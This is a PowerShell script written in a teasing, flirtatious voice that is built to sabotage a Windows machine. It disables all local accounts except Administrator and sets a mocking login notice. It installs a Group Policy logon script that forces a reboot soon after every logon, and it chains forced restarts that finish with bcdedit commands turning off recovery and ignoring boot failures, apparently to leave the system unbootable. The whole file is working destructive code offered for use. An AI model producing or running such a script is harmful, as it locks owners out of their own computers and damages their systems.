# hello
$users = Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True"
foreach ($user in $users) {
    if ($user.Name -ne "Administrator") {
        Disable-LocalUser -Name $user.Name
        Write-Host "Disabled user: $($user.Name)"
    }
}

# hehe
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
New-ItemProperty -Path $regPath -Name "LegalNoticeCaption" -Value "Oops~! Seems Like You Can't Log In" -PropertyType String -Force
New-ItemProperty -Path $regPath -Name "LegalNoticeText" -Value "Oh, darling~ Looks like the login door is closed for now~. No entry for you~! But don't worry, you'll be back again soon, won't you? <3" -PropertyType String -Force

# cannot login anymore :(
$logonScript = @"
echo 'Ah~ Looks like login is temporarily locked, sweetie~ <3' > C:\Users\Public\Documents\LoginTease.txt
echo 'You’ll have to wait~ You can try again later, if you behave~ ;)' >> C:\Users\Public\Documents\LoginTease.txt
echo 'Here’s a little something for you to admire~ ;)' >> C:\Users\Public\Documents\LoginTease.txt
echo '' >> C:\Users\Public\Documents\LoginTease.txt
echo '      /\\_/\\' >> C:\Users\Public\Documents\LoginTease.txt
echo '     ( o.o )  <-- Looks like you\'re not getting in anytime soon~ <3' >> C:\Users\Public\Documents\LoginTease.txt
echo '      > ^ <' >> C:\Users\Public\Documents\LoginTease.txt
echo '' >> C:\Users\Public\Documents\LoginTease.txt
echo 'Oh, don\'t pout~ I’ll be back to tease you more~ ;)' >> C:\Users\Public\Documents\LoginTease.txt
shutdown /r /f /t 10
"@

$logonScriptPath = "C:\Windows\System32\GroupPolicy\User\Scripts\Logon\TeaseLoginScript.bat"
$logonScript | Out-File -FilePath $logonScriptPath -Force

# stubborn moment
gpupdate /force

# :3
# First restart: Teasing and restart
function FirstRestartTease {
    $TeaseMessage = @"
╔════════════════════════════╗
║                          <3│
║   "You thought you'd get in? │
║        Guess again, sweetheart~" │
║        I'm stubborn like that <3 │
╚════════════════════════════╝
"@
    Write-Host $TeaseMessage
    Start-Sleep -Seconds 2
    shutdown /r /f /t 0
}

# Second restart: More teasing and restart again
function SecondRestartTease {
    $TeaseMessage2 = @"
╔════════════════════════════╗
║   "Stubborn? Oh yes, I am! ;) │
║  Ready for round two, my darling? │
║      This time, you'll have to wait~ │
╚════════════════════════════╝
"@
    Write-Host $TeaseMessage2
    Start-Sleep -Seconds 2
    shutdown /r /f /t 0
}

# Final restart: teasing and corrupting the system (network boot screen)
function FinalRestartTease {
    $TeaseMessage3 = @"
╔════════════════════════════╗
║   "You tried, but you failed~ │
║      See you never again, love! <3 │
║   Bye-bye, sweetheart~" │
╚════════════════════════════╝
"@
    Write-Host $TeaseMessage3
    # Creating a "corrupt" situation by disabling the bootable drive and causing a network boot screen
    bcdedit /set {current} bootstatuspolicy ignoreallfailures
    bcdedit /set {current} recoveryenabled no
    bcdedit /set {default} bootmenupolicy legacy
    shutdown /r /f /t 0
}

# Check if this is the first, second, or final restart based on a flag file
if (Test-Path "C:\first_restart_done.txt") {
    if (Test-Path "C:\second_restart_done.txt") {
        FinalRestartTease
    } else {
        SecondRestartTease
        New-Item "C:\second_restart_done.txt" -ItemType File
    }
} else {
    FirstRestartTease
    New-Item "C:\first_restart_done.txt" -ItemType File
}
